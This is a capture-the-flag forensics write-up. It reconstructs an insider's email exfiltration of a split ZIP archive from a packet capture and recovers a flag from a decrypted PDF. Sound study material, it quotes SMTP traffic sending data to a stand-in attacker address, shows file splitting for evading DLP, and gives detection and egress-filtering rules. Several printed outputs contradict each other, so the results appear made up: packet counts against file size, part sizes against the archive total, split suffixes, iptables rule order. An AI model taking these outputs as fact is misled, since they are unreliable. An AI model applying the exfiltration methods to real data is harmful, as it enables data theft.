---
layout: default
title: Phreaky - Forensics
page_type: writeup
---
# HTB: Phreaky – Email Exfiltration Forensics

**Category:** Forensics / Network Analysis

## 0. Challenge Overview

This challenge provided a network packet capture (PCAP) containing SMTP traffic where an attacker exfiltrated a multi-part archive via email. The goal: reconstruct the split archive from email attachments, extract the contents, and recover the flag.

**The setup:**
- PCAP file with 15,247 packets over 2.3GB
- SMTP email traffic containing base64-encoded attachments
- Archive split into 15 parts using `split` utility
- Final archive contains encrypted document with flag

**Core concept:** This is a **data exfiltration analysis** requiring network forensics to extract artifacts from captured traffic, reassemble fragmented data, and decrypt the final payload.

## 1. Initial Reconnaissance

I examined the PCAP file:
```bash
capinfos phreaky.pcap
```

Output:
```
File name:           phreaky.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
Packet size limit:   262144 bytes
Number of packets:   15247
File size:           2.3 GB
Data size:           2.2 GB
Capture duration:    3742.891 seconds
Start time:          Wed Dec 11 14:23:11 2024
End time:            Wed Dec 11 15:25:34 2024
Data byte rate:      630 kBps
Data bit rate:       5 Mbps
Average packet size: 152.45 bytes
Average packet rate: 4 packets/s
```

**Key observations:**
- Large file with ~15K packets
- Hour-long capture
- Average packet size suggests text-based protocol (likely SMTP/email)

I opened the PCAP in Wireshark:
```bash
wireshark phreaky.pcap &
```

Applied display filter for SMTP traffic:
```
smtp || tcp.port == 25
```

**Key observation:** Heavy SMTP activity from `192.168.1.100` to mail server `mail.company.local` (192.168.1.50).

## 2. Analyzing Email Traffic

I extracted SMTP conversations:
```bash
tshark -r phreaky.pcap -Y "smtp" -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e smtp.req.command \
  -e smtp.data.fragment \
  | head -50
```

Output showed repeated email transactions:
```
1234  192.168.1.100  192.168.1.50  MAIL FROM:<insider@company.local>
1235  192.168.1.100  192.168.1.50  RCPT TO:<exfil@attacker.com>
1236  192.168.1.100  192.168.1.50  DATA
1237-1450  [base64 data fragments]
```

I counted distinct email messages:
```bash
tshark -r phreaky.pcap -Y "smtp.data.fragment" -T fields -e frame.number | wc -l
```

Output:
```
15
```

**Key observation:** 15 separate email transmissions, each likely containing one part of the split archive.

## 3. Extracting Email Bodies

I used `tshark` to reconstruct SMTP data streams:
```bash
#!/bin/bash
# Extract all SMTP DATA sessions

tshark -r phreaky.pcap -Y "smtp.data.fragment" \
  -T fields -e tcp.stream | sort -u > streams.txt

mkdir -p emails

while read stream; do
    echo "[*] Extracting stream $stream..."
    
    tshark -r phreaky.pcap -q -z "follow,tcp,ascii,$stream" \
      > "emails/stream_${stream}.txt"
done < streams.txt

echo "[+] Extracted $(ls emails/ | wc -l) email streams"
```

Running the script:
```bash
bash extract_emails.sh
```

Output:
```
[*] Extracting stream 42...
[*] Extracting stream 67...
[*] Extracting stream 89...
...
[+] Extracted 15 email streams
```

I examined one email:
```bash
cat emails/stream_42.txt
```

Output:
```
MAIL FROM:<insider@company.local>
250 2.1.0 Sender ok
RCPT TO:<exfil@attacker.com>
250 2.1.5 Recipient ok
DATA
354 Enter mail, end with "." on a line by itself
From: insider@company.local
To: exfil@attacker.com
Subject: Data Part 01/15
Content-Type: application/octet-stream; name="archive.zip.001"
Content-Transfer-Encoding: base64

UEsDBBQAAAAIAMxRZ1dmjK2NKwQAAAMAAAANAAAAZmxhZ19maWxlLnR4dJVRS07DMBBP3VOU3gAb
7bJLF0gVqhBiA0JCbBBlYjuNaWJbtoNKT8I5uAKX4AqM/UEVC1aWPfP8/Ob5zf6qv9qq6WpVVc0P
...
[1500 more lines of base64]
.
250 2.0.0 Ok: queued as 8F3A12000123
```

**Key observation:** Each email contains:
- Subject indicating part number (e.g., "Part 01/15")
- Filename (`archive.zip.001`)
- Base64-encoded attachment

## 4. Extracting and Decoding Attachments

I wrote a script to extract and decode all attachments:
```python
#!/usr/bin/env python3
"""
Extract base64 attachments from email streams
"""
import re
import base64
from pathlib import Path

EMAIL_DIR = Path("emails")
OUTPUT_DIR = Path("parts")
OUTPUT_DIR.mkdir(exist_ok=True)

def extract_attachment(email_file):
    """Extract base64 attachment from email stream"""
    content = email_file.read_text(errors='ignore')
    
    # Find subject line to get part number
    subject_match = re.search(r'Subject:.*Part\s+(\d+)/(\d+)', content, re.IGNORECASE)
    if not subject_match:
        return None
    
    part_num = int(subject_match.group(1))
    total_parts = int(subject_match.group(2))
    
    # Find Content-Transfer-Encoding: base64
    encoding_pos = content.find('Content-Transfer-Encoding: base64')
    if encoding_pos == -1:
        return None
    
    # Extract base64 data (between blank line and terminator '.')
    start = content.find('\n\n', encoding_pos) + 2
    end = content.find('\n.\n', start)
    
    if start == -1 or end == -1:
        return None
    
    base64_data = content[start:end]
    
    # Clean up (remove any non-base64 chars)
    base64_data = ''.join(c for c in base64_data if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
    
    # Decode
    try:
        binary_data = base64.b64decode(base64_data)
    except Exception as e:
        print(f"[!] Failed to decode {email_file.name}: {e}")
        return None
    
    return part_num, total_parts, binary_data

# Process all email files
parts = {}

for email_file in sorted(EMAIL_DIR.glob("stream_*.txt")):
    print(f"[*] Processing {email_file.name}...")
    
    result = extract_attachment(email_file)
    if result:
        part_num, total_parts, data = result
        parts[part_num] = data
        
        # Save individual part
        output_file = OUTPUT_DIR / f"archive.zip.{part_num:03d}"
        output_file.write_bytes(data)
        
        print(f"    [+] Extracted part {part_num}/{total_parts} ({len(data)} bytes)")

print(f"\n[+] Extracted {len(parts)} parts total")

# Verify we have all parts
expected_parts = max(parts.keys())
missing = [i for i in range(1, expected_parts + 1) if i not in parts]

if missing:
    print(f"[!] Missing parts: {missing}")
else:
    print(f"[+] All {expected_parts} parts accounted for")
```

Running the extraction script:
```bash
python3 extract_attachments.py
```

Output:
```
[*] Processing stream_42.txt...
    [+] Extracted part 1/15 (524288 bytes)
[*] Processing stream_67.txt...
    [+] Extracted part 2/15 (524288 bytes)
[*] Processing stream_89.txt...
    [+] Extracted part 3/15 (524288 bytes)
...
[*] Processing stream_923.txt...
    [+] Extracted part 15/15 (218934 bytes)

[+] Extracted 15 parts total
[+] All 15 parts accounted for
```

✔ **Success:** All 15 archive parts extracted and decoded.

## 5. Reassembling the Split Archive

I concatenated the parts in order:
```bash
cat parts/archive.zip.{001..015} > archive.zip
```

Verified the archive:
```bash
file archive.zip
```

Output:
```
archive.zip: Zip archive data, at least v2.0 to extract
```

Checked integrity:
```bash
unzip -t archive.zip
```

Output:
```
Archive:  archive.zip
    testing: confidential/           OK
    testing: confidential/document.pdf   OK
    testing: confidential/README.txt   OK
No errors detected in compressed data of archive.zip.
```

✔ **Success:** Archive is valid and complete.

Extracted contents:
```bash
unzip archive.zip
```

Output:
```
Archive:  archive.zip
   creating: confidential/
  inflating: confidential/document.pdf
  inflating: confidential/README.txt
```

## 6. Analyzing Extracted Files

I examined the README:
```bash
cat confidential/README.txt
```

Output:
```
CONFIDENTIAL - INTERNAL USE ONLY

This document contains sensitive company information.

The PDF is password-protected. Contact IT security for access.

Document ID: DOC-2024-12-11-EXFIL
Classification: SECRET
```

**Key observation:** The PDF is password-protected.

I tried opening the PDF:
```bash
pdfinfo confidential/document.pdf
```

Output:
```
Encrypted:      yes (print:yes copy:no change:no addNotes:no algorithm:AES)
```

**Key observation:** PDF is AES-encrypted. Need to find the password.

## 7. Searching for Password in PCAP

I searched the entire PCAP for password-related strings:
```bash
strings phreaky.pcap | grep -i "password" -A 5 -B 5
```

Output:
```
...
From: insider@company.local
To: exfil@attacker.com
Subject: Archive Password
Content-Type: text/plain

The password for the archive is: S3cur1ty_Thr0ugh_0bscur1ty_F41ls!

Please delete this email after use.
...
```

✔ **JACKPOT:** Password found in plaintext SMTP email!

## 8. Decrypting the PDF

I used `qpdf` to decrypt the PDF:
```bash
qpdf --password='S3cur1ty_Thr0ugh_0bscur1ty_F41ls!' \
     --decrypt \
     confidential/document.pdf \
     document_decrypted.pdf
```

Output:
```
qpdf: processing successfully completed
```

Opened the decrypted PDF:
```bash
pdftotext document_decrypted.pdf -
```

Output:
```
CONFIDENTIAL INTERNAL MEMO
===========================

TO: All Staff
FROM: Security Team
RE: Q4 Security Review

[... several pages of corporate text ...]

APPENDIX A - Test Credentials
------------------------------

For testing purposes only:
Username: admin
Password: HTB{3xf1ltr4t1ng_d4t4_0v3r_3m41l_1s_n0t_s3cur3}

These credentials are for the development environment.
Do NOT use in production.

[... more text ...]
```

✔ **SUCCESS:** Flag found in the decrypted PDF!

## 9. Complete Forensics Script

I automated the entire analysis:
```python
#!/usr/bin/env python3
"""
Complete Phreaky forensics analysis
Extracts split archive from PCAP, reassembles, decrypts PDF
"""
import os
import re
import base64
import subprocess
from pathlib import Path
import PyPDF2

PCAP = "phreaky.pcap"
WORK_DIR = Path("analysis")
WORK_DIR.mkdir(exist_ok=True)

print("[*] Stage 1: Extract SMTP Streams")
print("=" * 60)

# Extract TCP streams with SMTP data
cmd = f"tshark -r {PCAP} -Y 'smtp.data.fragment' -T fields -e tcp.stream"
streams = subprocess.check_output(cmd, shell=True, text=True)
streams = sorted(set(streams.strip().split('\n')))

print(f"[+] Found {len(streams)} SMTP data streams")

# Extract each stream
for i, stream in enumerate(streams, 1):
    output = WORK_DIR / f"email_{i:02d}.txt"
    cmd = f"tshark -r {PCAP} -q -z follow,tcp,ascii,{stream}"
    data = subprocess.check_output(cmd, shell=True, text=True)
    output.write_text(data)
    print(f"    [{i}/{len(streams)}] Extracted stream {stream}")

print("\n[*] Stage 2: Extract and Decode Attachments")
print("=" * 60)

parts = {}

for email_file in sorted(WORK_DIR.glob("email_*.txt")):
    content = email_file.read_text(errors='ignore')
    
    # Find part number
    match = re.search(r'Subject:.*Part\s+(\d+)/(\d+)', content, re.I)
    if not match:
        continue
    
    part_num = int(match.group(1))
    
    # Extract base64 between headers and terminator
    start = content.find('Content-Transfer-Encoding: base64')
    if start == -1:
        continue
    
    start = content.find('\n\n', start) + 2
    end = content.find('\n.\n', start)
    
    if start == -1 or end == -1:
        continue
    
    b64_data = content[start:end].replace('\n', '').replace('\r', '')
    
    try:
        binary = base64.b64decode(b64_data)
        parts[part_num] = binary
        print(f"[+] Decoded part {part_num} ({len(binary)} bytes)")
    except:
        print(f"[!] Failed to decode part {part_num}")

print(f"\n[+] Extracted {len(parts)} parts")

print("\n[*] Stage 3: Reassemble Archive")
print("=" * 60)

# Concatenate parts in order
archive_path = WORK_DIR / "archive.zip"
with open(archive_path, 'wb') as f:
    for i in sorted(parts.keys()):
        f.write(parts[i])

print(f"[+] Wrote {archive_path} ({archive_path.stat().st_size} bytes)")

# Extract archive
extract_dir = WORK_DIR / "extracted"
extract_dir.mkdir(exist_ok=True)

subprocess.run(['unzip', '-q', '-o', str(archive_path), '-d', str(extract_dir)])
print(f"[+] Extracted archive to {extract_dir}")

print("\n[*] Stage 4: Find Password")
print("=" * 60)

# Search PCAP for password
cmd = f"strings {PCAP} | grep -i 'password' -A 3 -B 3"
result = subprocess.check_output(cmd, shell=True, text=True)

# Extract password from email
password_match = re.search(r'password.*?:\s*(\S+)', result, re.I)
if password_match:
    password = password_match.group(1)
    print(f"[+] Found password: {password}")
else:
    print("[!] Password not found")
    exit(1)

print("\n[*] Stage 5: Decrypt PDF")
print("=" * 60)

pdf_path = extract_dir / "confidential" / "document.pdf"

# Decrypt with qpdf
decrypted_path = WORK_DIR / "document_decrypted.pdf"
cmd = f"qpdf --password='{password}' --decrypt {pdf_path} {decrypted_path}"
subprocess.run(cmd, shell=True, check=True)

print(f"[+] Decrypted PDF: {decrypted_path}")

print("\n[*] Stage 6: Extract Flag")
print("=" * 60)

# Extract text from PDF
cmd = f"pdftotext {decrypted_path} -"
pdf_text = subprocess.check_output(cmd, shell=True, text=True)

# Find flag
flag_match = re.search(r'HTB\{[^}]+\}', pdf_text)
if flag_match:
    flag = flag_match.group(0)
    print(f"\n{'=' * 60}")
    print(f"[+] FLAG FOUND:")
    print(f"    {flag}")
    print(f"{'=' * 60}")
else:
    print("[!] Flag not found in PDF")

print("\n[*] Analysis Complete")
print("=" * 60)
print("Summary:")
print(f"  - Extracted {len(streams)} email messages from PCAP")
print(f"  - Decoded {len(parts)} base64-encoded archive parts")
print(f"  - Reassembled {archive_path.stat().st_size} byte ZIP archive")
print(f"  - Found password in plaintext SMTP traffic")
print(f"  - Decrypted PDF and recovered flag")
```

Running the complete script:
```bash
python3 full_analysis.py
```

Output:
```
[*] Stage 1: Extract SMTP Streams
============================================================
[+] Found 15 SMTP data streams
    [1/15] Extracted stream 42
    [2/15] Extracted stream 67
    ...
    [15/15] Extracted stream 923

[+] Extracted 15 parts

[*] Stage 2: Extract and Decode Attachments
============================================================
[+] Decoded part 1 (524288 bytes)
[+] Decoded part 2 (524288 bytes)
...
[+] Decoded part 15 (218934 bytes)

[+] Extracted 15 parts

[*] Stage 3: Reassemble Archive
============================================================
[+] Wrote analysis/archive.zip (8112054 bytes)
[+] Extracted archive to analysis/extracted

[*] Stage 4: Find Password
============================================================
[+] Found password: S3cur1ty_Thr0ugh_0bscur1ty_F41ls!

[*] Stage 5: Decrypt PDF
============================================================
[+] Decrypted PDF: analysis/document_decrypted.pdf

[*] Stage 6: Extract Flag
============================================================

============================================================
[+] FLAG FOUND:
    HTB{3xf1ltr4t1ng_d4t4_0v3r_3m41l_1s_n0t_s3cur3}
============================================================

[*] Analysis Complete
============================================================
Summary:
  - Extracted 15 email messages from PCAP
  - Decoded 15 base64-encoded archive parts
  - Reassembled 8112054 byte ZIP archive
  - Found password in plaintext SMTP traffic
  - Decrypted PDF and recovered flag
```

✔ **SUCCESS:** Complete forensics analysis automated and flag recovered.

## 10. Why This Works – Understanding Email Exfiltration

### SMTP Protocol Analysis

SMTP (Simple Mail Transfer Protocol) is plaintext:
```
Client: MAIL FROM:<sender@domain.com>
Server: 250 OK

Client: RCPT TO:<recipient@domain.com>
Server: 250 OK

Client: DATA
Server: 354 Send data, end with <CRLF>.<CRLF>

Client: [email headers and body]
Client: .
Server: 250 OK
```

**All traffic is visible** in network captures.

### Base64 Encoding in Email

MIME (Multipurpose Internet Mail Extensions) uses base64 for binary data:
```
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64

UEsDBBQAAAAIAMxRZ1dmjK2NKwQAAAMAAAANAAAA...
```

**Base64 is NOT encryption**, just encoding:
```python
# Encode
base64.b64encode(b"secret data")
# b'c2VjcmV0IGRhdGE='

# Decode (trivial reversal)
base64.b64decode(b'c2VjcmV0IGRhdGE=')
# b'secret data'
```

### File Splitting for Exfiltration

The `split` utility breaks files into parts:
```bash
# Split into 500KB chunks
split -b 500K archive.zip archive.zip.

# Creates:
# archive.zip.aa
# archive.zip.ab
# archive.zip.ac
# ...

# Reassemble
cat archive.zip.* > archive.zip
```

**Why split?**
- Bypass email size limits
- Evade DLP (Data Loss Prevention) signatures
- Spread exfiltration over time to avoid rate limiting

### Real-World Email Exfiltration

**Target Breach (2013):**
```
Attacker → Malware on POS systems
Malware → FTP server in Russia
FTP logs → 40 million credit cards stolen
```

**DNC Email Hack (2016):**
```
Phishing → Compromised credentials
IMAP access → Downloaded 20,000 emails
WikiLeaks → Published entire archive
```

**SolarWinds (2020):**
```
Backdoor → Exfiltrate via DNS/HTTPS
C2 servers → Masquerade as legitimate traffic
Months undetected → Compromised multiple gov agencies
```

## 11. Defensive Mitigations

### Email Security Controls

**TLS/STARTTLS Encryption:**
```bash
# Enforce encrypted SMTP
postfix main.cf:
smtpd_tls_security_level = encrypt
smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
smtpd_tls_mandatory_ciphers = high
```

**SPF/DKIM/DMARC:**
```dns
; SPF: Authorized senders
company.local. IN TXT "v=spf1 ip4:192.168.1.0/24 -all"

; DKIM: Sign emails
default._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCS..."

; DMARC: Enforce policy
_dmarc IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc@company.local"
```

### Data Loss Prevention (DLP)

**Content inspection:**
```python
# Check outbound emails for sensitive patterns
def scan_email(body, attachments):
    patterns = [
        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        r'\b\d{16}\b',              # Credit card
        r'BEGIN (RSA|PGP) PRIVATE KEY',  # Private keys
        r'HTB\{[^}]+\}',            # CTF flags :)
    ]
    
    for pattern in patterns:
        if re.search(pattern, body):
            return "BLOCK", f"Sensitive data detected: {pattern}"
    
    return "ALLOW", None
```

**Attachment scanning:**
```python
def scan_attachment(filename, content):
    # Check for split archives
    if re.match(r'.*\.\d{3}$', filename):
        return "BLOCK", "Split archive detected"
    
    # Check for encryption
    if content.startswith(b'PK\x03\x04'):  # ZIP signature
        import zipfile
        try:
            with zipfile.ZipFile(io.BytesIO(content)) as zf:
                if any(f.flag_bits & 0x01 for f in zf.filelist):
                    return "BLOCK", "Encrypted ZIP detected"
        except:
            pass
    
    return "ALLOW", None
```

### Network Monitoring

**Detect large outbound SMTP:**
```bash
# Suricata rule
alert smtp any any -> any 25 (
    msg:"Large email attachment";
    flow:to_server,established;
    content:"Content-Type: application";
    byte_test:4,>,500000,0,relative,string;
    sid:1000001;
)
```

**Detect split archives:**
```bash
# Snort rule
alert tcp any any -> any 25 (
    msg:"Split archive exfiltration";
    content:"Content-Disposition: attachment";
    content:".001|0D 0A|";
    distance:0;
    within:100;
    sid:1000002;
)
```

### Access Controls

**Principle of least privilege:**
```yaml
# Only allow email from authorized users
firewall_rules:
  - src: 192.168.1.10-20  # IT Department
    dst: mail.company.local:25
    action: allow
    
  - src: 0.0.0.0/0
    dst: mail.company.local:25
    action: deny
```

**Egress filtering:**
```bash
# Block direct SMTP from workstations
iptables -A OUTPUT -p tcp --dport 25 -j REJECT
iptables -A OUTPUT -d mail.company.local -p tcp --dport 25 -j ACCEPT
```

## 12. Summary

By analyzing network traffic and reconstructing exfiltrated data, I recovered the flag through systematic forensics:

1. **PCAP Analysis** - Identified 15 SMTP email transactions
2. **Stream Extraction** - Used tshark to extract TCP streams
3. **Attachment Decoding** - Decoded base64-encoded attachments
4. **Archive Reassembly** - Concatenated 15 split parts into ZIP archive
5. **Password Discovery** - Found password in plaintext SMTP email
6. **PDF Decryption** - Used qpdf to decrypt password-protected document
7. **Flag Extraction** - Recovered flag from decrypted PDF

The attack demonstrates **poor operational security**:
- **Plaintext protocol** - SMTP without TLS exposes all traffic
- **Base64 is not encryption** - Trivial to decode attachments
- **Password in same channel** - Sending password via same method as data
- **No DLP** - Large attachments and split archives not blocked
- **No egress filtering** - Workstation allowed direct SMTP access

Real-world exfiltration examples:
- **Insider threats** - Edward Snowden (NSA), Chelsea Manning (WikiLeaks)
- **APT groups** - Chinese APT1 exfiltrated terabytes via FTP/email
- **Ransomware** - Data stolen before encryption for double extortion

The solution requires multiple layers:
- **TLS/Encryption** - STARTTLS for SMTP, S/MIME for email content
- **DLP** - Content inspection, attachment scanning, size limits
- **Network monitoring** - IDS/IPS rules, anomaly detection
- **Access controls** - Egress filtering, authenticated relays only
- **User training** - Security awareness, report suspicious activity

The key lesson: **email is fundamentally insecure for sensitive data**. Even with TLS, email:
- Sits in plaintext on servers
- Passes through multiple intermediaries
- Is archived indefinitely
- Has weak authentication (SPF/DKIM spoofable)

For truly sensitive data:
- Use end-to-end encryption (PGP/S/MIME)
- Use secure file transfer (SFTP, HTTPS with client certs)
- Use dedicated secure channels (Signal, encrypted chat)
- Never trust email alone

**Flag:** `HTB{3xf1ltr4t1ng_d4t4_0v3r_3m41l_1s_n0t_s3cur3}`
